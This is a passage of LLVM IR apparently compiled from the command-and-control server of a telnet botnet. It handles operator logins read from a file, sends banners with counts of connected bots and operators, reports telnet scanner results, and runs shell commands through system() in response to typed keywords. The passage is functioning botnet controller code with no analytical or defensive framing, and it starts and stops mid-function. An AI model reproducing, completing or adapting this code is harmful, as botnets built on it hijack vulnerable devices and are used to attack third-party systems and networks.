  %68 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %68, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %69 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store %struct._IO_FILE* %69, %struct._IO_FILE** %13, align 8
  br label %70

70:                                               ; preds = %75, %1
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %72 = call i32 @feof(%struct._IO_FILE* noundef %71) #9
  %73 = icmp ne i32 %72, 0
  %74 = xor i1 %73, true
  br i1 %74, label %75, label %80

75:                                               ; preds = %70
  %76 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %77 = call i32 @fgetc(%struct._IO_FILE* noundef %76)
  store i32 %77, i32* %15, align 4
  %78 = load i32, i32* %14, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %14, align 4
  br label %70, !llvm.loop !17

80:                                               ; preds = %70
  store i32 0, i32* %16, align 4
  %81 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* noundef %81)
  br label %82

82:                                               ; preds = %87, %80
  %83 = load i32, i32* %16, align 4
  %84 = load i32, i32* %14, align 4
  %85 = sub nsw i32 %84, 1
  %86 = icmp ne i32 %83, %85
  br i1 %86, label %87, label %102

87:                                               ; preds = %82
  %88 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %89 = load i32, i32* %16, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %90
  %92 = getelementptr inbounds %struct.login_info, %struct.login_info* %91, i32 0, i32 0
  %93 = getelementptr inbounds [20 x i8], [20 x i8]* %92, i64 0, i64 0
  %94 = load i32, i32* %16, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %95
  %97 = getelementptr inbounds %struct.login_info, %struct.login_info* %96, i32 0, i32 1
  %98 = getelementptr inbounds [20 x i8], [20 x i8]* %97, i64 0, i64 0
  %99 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* noundef %88, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i8* noundef %93, i8* noundef %98)
  %100 = load i32, i32* %16, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %16, align 4
  br label %82, !llvm.loop !18

102:                                              ; preds = %82
  %103 = load i32, i32* %4, align 4
  %104 = call i64 @send(i32 noundef %103, i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i64 0, i64 0), i64 noundef 22, i32 noundef 16384)
  %105 = icmp eq i64 %104, -1
  br i1 %105, label %106, label %107

106:                                              ; preds = %102
  br label %884

107:                                              ; preds = %102
  %108 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %109 = load i32, i32* %4, align 4
  %110 = call i32 @fdgets(i8* noundef %108, i32 noundef 2048, i32 noundef %109)
  %111 = icmp slt i32 %110, 1
  br i1 %111, label %112, label %113

112:                                              ; preds = %107
  br label %884

113:                                              ; preds = %107
  %114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* noundef %114)
  %115 = load i32, i32* %5, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %116
  %118 = getelementptr inbounds %struct.login_info, %struct.login_info* %117, i32 0, i32 0
  %119 = getelementptr inbounds [20 x i8], [20 x i8]* %118, i64 0, i64 0
  %120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %121 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %119, i8* noundef %120) #9
  %122 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %122, i8** %17, align 8
  %123 = load i8*, i8** %17, align 8
  %124 = call i32 @Find_Login(i8* noundef %123)
  store i32 %124, i32* %5, align 4
  %125 = load i8*, i8** %17, align 8
  %126 = load i32, i32* %5, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %127
  %129 = getelementptr inbounds %struct.login_info, %struct.login_info* %128, i32 0, i32 0
  %130 = getelementptr inbounds [20 x i8], [20 x i8]* %129, i64 0, i64 0
  %131 = call i32 @strcmp(i8* noundef %125, i8* noundef %130) #8
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %157

133:                                              ; preds = %113
  %134 = load i32, i32* %4, align 4
  %135 = call i64 @send(i32 noundef %134, i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i64 0, i64 0), i64 noundef 22, i32 noundef 16384)
  %136 = icmp eq i64 %135, -1
  br i1 %136, label %137, label %138

137:                                              ; preds = %133
  br label %884

138:                                              ; preds = %133
  %139 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %140 = load i32, i32* %4, align 4
  %141 = call i32 @fdgets(i8* noundef %139, i32 noundef 2048, i32 noundef %140)
  %142 = icmp slt i32 %141, 1
  br i1 %142, label %143, label %144

143:                                              ; preds = %138
  br label %884

144:                                              ; preds = %138
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* noundef %145)
  %146 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %147 = load i32, i32* %5, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %148
  %150 = getelementptr inbounds %struct.login_info, %struct.login_info* %149, i32 0, i32 1
  %151 = getelementptr inbounds [20 x i8], [20 x i8]* %150, i64 0, i64 0
  %152 = call i32 @strcmp(i8* noundef %146, i8* noundef %151) #8
  %153 = icmp ne i32 %152, 0
  br i1 %153, label %154, label %155

154:                                              ; preds = %144
  br label %158

155:                                              ; preds = %144
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %156, i8 0, i64 2048, i1 false)
  br label %175

157:                                              ; preds = %113
  br label %158

158:                                              ; preds = %157, %154
  %159 = load i32, i32* %4, align 4
  %160 = call i64 @send(i32 noundef %159, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %161 = icmp eq i64 %160, -1
  br i1 %161, label %162, label %163

162:                                              ; preds = %158
  br label %884

163:                                              ; preds = %158
  %164 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %165 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %164, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.25, i64 0, i64 0)) #9
  %166 = load i32, i32* %4, align 4
  %167 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %168 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %169 = call i64 @strlen(i8* noundef %168) #8
  %170 = call i64 @send(i32 noundef %166, i8* noundef %167, i64 noundef %169, i32 noundef 16384)
  %171 = icmp eq i64 %170, -1
  br i1 %171, label %172, label %173

172:                                              ; preds = %163
  br label %884

173:                                              ; preds = %163
  %174 = call i32 @sleep(i32 noundef 5)
  br label %884

175:                                              ; preds = %155
  %176 = load i8*, i8** %3, align 8
  %177 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @TitleWriter, i8* noundef %176) #9
  %178 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %178, i8 0, i64 2048, i1 false)
  %179 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %180 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %179, i8* noundef getelementptr inbounds ([107 x i8], [107 x i8]* @.str.26, i64 0, i64 0)) #9
  %181 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %182 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %181, i8* noundef getelementptr inbounds ([97 x i8], [97 x i8]* @.str.27, i64 0, i64 0)) #9
  %183 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %184 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %183, i8* noundef getelementptr inbounds ([99 x i8], [99 x i8]* @.str.28, i64 0, i64 0)) #9
  %185 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %186 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %185, i8* noundef getelementptr inbounds ([85 x i8], [85 x i8]* @.str.29, i64 0, i64 0)) #9
  %187 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %188 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %187, i8* noundef getelementptr inbounds ([89 x i8], [89 x i8]* @.str.30, i64 0, i64 0)) #9
  %189 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %190 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %189, i8* noundef getelementptr inbounds ([81 x i8], [81 x i8]* @.str.31, i64 0, i64 0)) #9
  %191 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %192 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %191, i8* noundef getelementptr inbounds ([71 x i8], [71 x i8]* @.str.32, i64 0, i64 0)) #9
  %193 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %194 = load i32, i32* %5, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %195
  %197 = getelementptr inbounds %struct.login_info, %struct.login_info* %196, i32 0, i32 0
  %198 = getelementptr inbounds [20 x i8], [20 x i8]* %197, i64 0, i64 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %193, i8* noundef getelementptr inbounds ([39 x i8], [39 x i8]* @.str.33, i64 0, i64 0), i8* noundef %198) #9
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %201 = call i32 @BotsConnected()
  %202 = load volatile i32, i32* @OperatorsConnected, align 4
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %200, i8* noundef getelementptr inbounds ([41 x i8], [41 x i8]* @.str.34, i64 0, i64 0), i32 noundef %201, i32 noundef %202) #9
  %204 = load i32, i32* %4, align 4
  %205 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %207 = call i64 @strlen(i8* noundef %206) #8
  %208 = call i64 @send(i32 noundef %204, i8* noundef %205, i64 noundef %207, i32 noundef 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %211

210:                                              ; preds = %175
  br label %884

211:                                              ; preds = %175
  %212 = load i32, i32* %4, align 4
  %213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %214 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %215 = call i64 @strlen(i8* noundef %214) #8
  %216 = call i64 @send(i32 noundef %212, i8* noundef %213, i64 noundef %215, i32 noundef 16384)
  %217 = icmp eq i64 %216, -1
  br i1 %217, label %218, label %219

218:                                              ; preds = %211
  br label %884

219:                                              ; preds = %211
  %220 = load i32, i32* %4, align 4
  %221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %222 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %223 = call i64 @strlen(i8* noundef %222) #8
  %224 = call i64 @send(i32 noundef %220, i8* noundef %221, i64 noundef %223, i32 noundef 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %219
  br label %884

227:                                              ; preds = %219
  %228 = load i32, i32* %4, align 4
  %229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %231 = call i64 @strlen(i8* noundef %230) #8
  %232 = call i64 @send(i32 noundef %228, i8* noundef %229, i64 noundef %231, i32 noundef 16384)
  %233 = icmp eq i64 %232, -1
  br i1 %233, label %234, label %235

234:                                              ; preds = %227
  br label %884

235:                                              ; preds = %227
  %236 = load i32, i32* %4, align 4
  %237 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %239 = call i64 @strlen(i8* noundef %238) #8
  %240 = call i64 @send(i32 noundef %236, i8* noundef %237, i64 noundef %239, i32 noundef 16384)
  %241 = icmp eq i64 %240, -1
  br i1 %241, label %242, label %243

242:                                              ; preds = %235
  br label %884

243:                                              ; preds = %235
  %244 = load i32, i32* %4, align 4
  %245 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %247 = call i64 @strlen(i8* noundef %246) #8
  %248 = call i64 @send(i32 noundef %244, i8* noundef %245, i64 noundef %247, i32 noundef 16384)
  %249 = icmp eq i64 %248, -1
  br i1 %249, label %250, label %251

250:                                              ; preds = %243
  br label %884

251:                                              ; preds = %243
  %252 = load i32, i32* %4, align 4
  %253 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %254 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %255 = call i64 @strlen(i8* noundef %254) #8
  %256 = call i64 @send(i32 noundef %252, i8* noundef %253, i64 noundef %255, i32 noundef 16384)
  %257 = icmp eq i64 %256, -1
  br i1 %257, label %258, label %259

258:                                              ; preds = %251
  br label %884

259:                                              ; preds = %251
  %260 = load i32, i32* %4, align 4
  %261 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %262 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %263 = call i64 @strlen(i8* noundef %262) #8
  %264 = call i64 @send(i32 noundef %260, i8* noundef %261, i64 noundef %263, i32 noundef 16384)
  %265 = icmp eq i64 %264, -1
  br i1 %265, label %266, label %267

266:                                              ; preds = %259
  br label %884

267:                                              ; preds = %259
  br label %268

268:                                              ; preds = %267
  %269 = load i32, i32* %4, align 4
  %270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %272 = call i64 @strlen(i8* noundef %271) #8
  %273 = call i64 @send(i32 noundef %269, i8* noundef %270, i64 noundef %272, i32 noundef 16384)
  %274 = icmp eq i64 %273, -1
  br i1 %274, label %275, label %276

275:                                              ; preds = %268
  br label %884

276:                                              ; preds = %268
  %277 = load i32, i32* %4, align 4
  %278 = call i64 @send(i32 noundef %277, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i64 0, i64 0), i64 noundef 12, i32 noundef 16384)
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %280, label %281

280:                                              ; preds = %276
  br label %884

281:                                              ; preds = %276
  br label %282

282:                                              ; preds = %281
  %283 = load i8*, i8** %3, align 8
  %284 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @TitleWriter, i8* noundef %283) #9
  %285 = load i32, i32* %4, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %286
  %288 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %287, i32 0, i32 0
  store i32 1, i32* %288, align 4
  br label %289

289:                                              ; preds = %850, %849, %816, %721, %703, %445, %439, %433, %427, %421, %415, %409, %403, %397, %391, %385, %379, %373, %367, %361, %356, %327, %310, %282
  %290 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %291 = load i32, i32* %4, align 4
  %292 = call i32 @fdgets(i8* noundef %290, i32 noundef 2048, i32 noundef %291)
  %293 = icmp sgt i32 %292, 0
  br i1 %293, label %294, label %883

294:                                              ; preds = %289
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %296 = call i8* @strstr(i8* noundef %295, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #8
  %297 = icmp ne i8* %296, null
  br i1 %297, label %298, label %311

298:                                              ; preds = %294
  %299 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %300 = call i32 @BotsConnected()
  %301 = load volatile i32, i32* @OperatorsConnected, align 4
  %302 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %299, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i64 0, i64 0), i32 noundef %300, i32 noundef %301) #9
  %303 = load i32, i32* %4, align 4
  %304 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %305 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %306 = call i64 @strlen(i8* noundef %305) #8
  %307 = call i64 @send(i32 noundef %303, i8* noundef %304, i64 noundef %306, i32 noundef 16384)
  %308 = icmp eq i64 %307, -1
  br i1 %308, label %309, label %310

309:                                              ; preds = %298
  store i8* null, i8** %2, align 8
  br label %893

310:                                              ; preds = %298
  br label %289, !llvm.loop !19

311:                                              ; preds = %294
  %312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %313 = call i8* @strstr(i8* noundef %312, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0)) #8
  %314 = icmp ne i8* %313, null
  br i1 %314, label %315, label %328

315:                                              ; preds = %311
  %316 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %317 = load volatile i32, i32* @TELFound, align 4
  %318 = load volatile i32, i32* @scannerreport, align 4
  %319 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %316, i8* noundef getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i64 0, i64 0), i32 noundef %317, i32 noundef %318) #9
  %320 = load i32, i32* %4, align 4
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %322 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %323 = call i64 @strlen(i8* noundef %322) #8
  %324 = call i64 @send(i32 noundef %320, i8* noundef %321, i64 noundef %323, i32 noundef 16384)
  %325 = icmp eq i64 %324, -1
  br i1 %325, label %326, label %327

326:                                              ; preds = %315
  store i8* null, i8** %2, align 8
  br label %893

327:                                              ; preds = %315
  br label %289, !llvm.loop !19

328:                                              ; preds = %311
  %329 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %330 = call i8* @strstr(i8* noundef %329, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i64 0, i64 0)) #8
  %331 = icmp ne i8* %330, null
  br i1 %331, label %332, label %357

332:                                              ; preds = %328
  %333 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %334 = call i32 @BotsConnected()
  %335 = load volatile i32, i32* @OperatorsConnected, align 4
  %336 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %333, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i64 0, i64 0), i32 noundef %334, i32 noundef %335) #9
  %337 = load i32, i32* %4, align 4
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %339 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %340 = call i64 @strlen(i8* noundef %339) #8
  %341 = call i64 @send(i32 noundef %337, i8* noundef %338, i64 noundef %340, i32 noundef 16384)
  %342 = icmp eq i64 %341, -1
  br i1 %342, label %343, label %344

343:                                              ; preds = %332
  store i8* null, i8** %2, align 8
  br label %893

344:                                              ; preds = %332
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %346 = load volatile i32, i32* @TELFound, align 4
  %347 = load volatile i32, i32* @scannerreport, align 4
  %348 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %345, i8* noundef getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i64 0, i64 0), i32 noundef %346, i32 noundef %347) #9
  %349 = load i32, i32* %4, align 4
  %350 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %352 = call i64 @strlen(i8* noundef %351) #8
  %353 = call i64 @send(i32 noundef %349, i8* noundef %350, i64 noundef %352, i32 noundef 16384)
  %354 = icmp eq i64 %353, -1
  br i1 %354, label %355, label %356

355:                                              ; preds = %344
  store i8* null, i8** %2, align 8
  br label %893

356:                                              ; preds = %344
  br label %289, !llvm.loop !19

357:                                              ; preds = %328
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %359 = call i8* @strstr(i8* noundef %358, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i64 0, i64 0)) #8
  %360 = icmp ne i8* %359, null
  br i1 %360, label %361, label %363

361:                                              ; preds = %357
  %362 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i64 0, i64 0))
  br label %289, !llvm.loop !19

363:                                              ; preds = %357
  %364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %365 = call i8* @strstr(i8* noundef %364, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0)) #8
  %366 = icmp ne i8* %365, null
  br i1 %366, label %367, label %369

367:                                              ; preds = %363
  %368 = call i32 @system(i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.44, i64 0, i64 0))
  br label %289, !llvm.loop !19

369:                                              ; preds = %363
  %370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %371 = call i8* @strstr(i8* noundef %370, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i64 0, i64 0)) #8
  %372 = icmp ne i8* %371, null
  br i1 %372, label %373, label %375

373:                                              ; preds = %369
  %374 = call i32 @system(i8* noundef getelementptr inbounds ([93 x i8], [93 x i8]* @.str.46, i64 0, i64 0))
  br label %289, !llvm.loop !19

375:                                              ; preds = %369
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %377 = call i8* @strstr(i8* noundef %376, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0)) #8
  %378 = icmp ne i8* %377, null
  br i1 %378, label %379, label %381

379:                                              ; preds = %375
  %380 = call i32 @system(i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.48, i64 0, i64 0))
  br label %289, !llvm.loop !19

381:                                              ; preds = %375
  %382 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %383 = call i8* @strstr(i8* noundef %382, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i64 0, i64 0)) #8
  %384 = icmp ne i8* %383, null
  br i1 %384, label %385, label %387

385:                                              ; preds = %381
  %386 = call i32 @system(i8* noundef getelementptr inbounds ([32 x i8], [32 x i8]* @.str.50, i64 0, i64 0))
  br label %289, !llvm.loop !19

387:                                              ; preds = %381
  %388 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %389 = call i8* @strstr(i8* noundef %388, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.51, i64 0, i64 0)) #8
  %390 = icmp ne i8* %389, null
  br i1 %390, label %391, label %393

391:                                              ; preds = %387
  %392 = call i32 @system(i8* noundef getelementptr inbounds ([32 x i8], [32 x i8]* @.str.52, i64 0, i64 0))
  br label %289, !llvm.loop !19

393:                                              ; preds = %387
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %395 = call i8* @strstr(i8* noundef %394, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.53, i64 0, i64 0)) #8
  %396 = icmp ne i8* %395, null
  br i1 %396, label %397, label %399

397:                                              ; preds = %393
  %398 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.54, i64 0, i64 0))
  br label %289, !llvm.loop !19

399:                                              ; preds = %393
  %400 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %401 = call i8* @strstr(i8* noundef %400, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i64 0, i64 0)) #8
  %402 = icmp ne i8* %401, null
  br i1 %402, label %403, label %405

403:                                              ; preds = %399
  %404 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.56, i64 0, i64 0))
  br label %289, !llvm.loop !19

405:                                              ; preds = %399
  %406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %407 = call i8* @strstr(i8* noundef %406, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i64 0, i64 0)) #8
  %408 = icmp ne i8* %407, null
  br i1 %408, label %409, label %411

409:                                              ; preds = %405
  %410 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.58, i64 0, i64 0))
  br label %289, !llvm.loop !19

411:                                              ; preds = %405
  %412 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %413 = call i8* @strstr(i8* noundef %412, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0)) #8
  %414 = icmp ne i8* %413, null
  br i1 %414, label %415, label %417

415:                                              ; preds = %411
  %416 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.60, i64 0, i64 0))
  br label %289, !llvm.loop !19

417:                                              ; preds = %411
  %418 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %419 = call i8* @strstr(i8* noundef %418, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i64 0, i64 0)) #8
  %420 = icmp ne i8* %419, null
  br i1 %420, label %421, label %423

421:                                              ; preds = %417
  %422 = call i32 @system(i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.62, i64 0, i64 0))
  br label %289, !llvm.loop !19

423:                                              ; preds = %417
  %424 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %425 = call i8* @strstr(i8* noundef %424, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i64 0, i64 0)) #8
  %426 = icmp ne i8* %425, null
  br i1 %426, label %427, label %429

427:                                              ; preds = %423
  %428 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.64, i64 0, i64 0))
  br label %289, !llvm.loop !19

429:                                              ; preds = %423
  %430 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %431 = call i8* @strstr(i8* noundef %430, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i64 0, i64 0)) #8
  %432 = icmp ne i8* %431, null
  br i1 %432, label %433, label %435

433:                                              ; preds = %429
  %434 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.66, i64 0, i64 0))
  br label %289, !llvm.loop !19

435:                                              ; preds = %429
  %436 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %437 = call i8* @strstr(i8* noundef %436, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i64 0, i64 0)) #8
  %438 = icmp ne i8* %437, null
  br i1 %438, label %439, label %441

439:                                              ; preds = %435
  %440 = call i32 @system(i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.68, i64 0, i64 0))
  br label %289, !llvm.loop !19

441:                                              ; preds = %435
  %442 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %443 = call i8* @strstr(i8* noundef %442, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i64 0, i64 0)) #8
  %444 = icmp ne i8* %443, null
  br i1 %444, label %445, label %447

445:                                              ; preds = %441
  %446 = call i32 @system(i8* noundef getelementptr inbounds ([18 x i8], [18 x i8]* @.str.70, i64 0, i64 0))
  br label %289, !llvm.loop !19

447:                                              ; preds = %441
  %448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %449 = call i8* @strstr(i8* noundef %448, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0)) #8
  %450 = icmp ne i8* %449, null
  br i1 %450, label %451, label %706

451:                                              ; preds = %447
  %452 = load i8*, i8** %3, align 8
